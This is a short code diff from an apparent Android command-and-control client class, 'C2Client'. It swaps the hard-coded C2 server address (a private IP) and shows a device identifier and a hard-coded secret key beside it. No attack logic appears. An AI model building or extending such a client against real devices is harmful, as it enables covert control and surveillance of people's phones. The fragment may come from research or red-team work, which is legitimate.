@@ -21,7 +21,7 @@ import kotlinx.coroutines.cancel
 class C2Client(private val context: Context) {
 
     // C2 Configuration
-    private val C2_BASE_URL = "http://10.178.181.107:3000/api/v1/"
+    private val C2_BASE_URL = "http://10.175.190.107:3000/api/v1/"
     private val DEVICE_ID = NetworkUtils.getDeviceId(context)
     private val SECRET_KEY = "PEGASUS-SECURE-KEY-2024"
 
